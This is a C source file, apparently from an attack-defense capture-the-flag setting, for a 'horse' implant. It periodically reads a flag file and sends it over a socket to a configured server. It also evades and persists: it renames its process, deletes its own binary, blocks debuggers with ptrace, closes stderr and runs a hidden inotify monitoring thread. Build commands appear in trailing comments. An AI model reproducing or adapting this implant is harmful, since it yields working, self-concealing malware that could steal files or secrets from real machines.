#define _GNU_SOURCE

#include "global_var.h"
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/ptrace.h>

char ip_addr[170] = {0};  

extern void inotify_monitor();


void get_flag_func(){

  char cmd_buffer[0x1000] = {0};
  char flag_buffer[0x100] = {0};
  int fl = get_flag(flag_buffer);	

  if (fl <= 0) return ;
  if (flag_buffer[fl -1] == '\n'){
    flag_buffer[fl -1] = 0;
  }


#ifdef SUBMIT
  char http_body[0x100] = {0};
  sprintf(http_body, HTTP_BODY, flag_buffer);
  int content_len = strlen(http_body);
  sprintf(cmd_buffer, HTTP_HEADER, content_len, http_body);
#else
  sprintf(cmd_buffer, "\\flag %s %s\\", ip_addr, flag_buffer);
#endif
  int ret = init_socket(SERVER_IP_ADDRESS, SERVER_PORT);
  if (ret < 0){
    return;
  }

  write_buffer(cmd_buffer);
  close_socket();
}


void sigalarm_handler() {

  get_flag_func();
  set_timer();
}


void iamhorse(int argc, char *argv[]){

  //printf("in horse\n");	
  change_name(argc, argv);	

  signal(SIGPIPE, SIG_IGN);
  void* inotify_stack = malloc(0x20000);
  //printf("in inotify\n");
  pid_t  ret = clone(inotify_monitor, inotify_stack+0x20000, CLONE_SIGHAND | CLONE_VM | CLONE_THREAD | CLONE_FILES | CLONE_FS, 0);

  signal(SIGALRM, sigalarm_handler);

  sigalarm_handler();
  while(1) sleep(-1);

}


void main(int argc, char *argv[]){
  ptrace(PTRACE_TRACEME, 0, 0, 0);

  strcpy(ip_addr, argv[1]);
  delete_self();
  close(2);

  iamhorse(argc, argv);

}

// cd /root/ctf/self-play/horse/horse2021/;su xzjtest;
//musl-gcc tcp_utils.c tool_utils.c horse.c -o abcc -w -Os -static
//musl-gcc kill.c tcp_utils.c tool_utils.c horse.c -o gnnk -w -Os
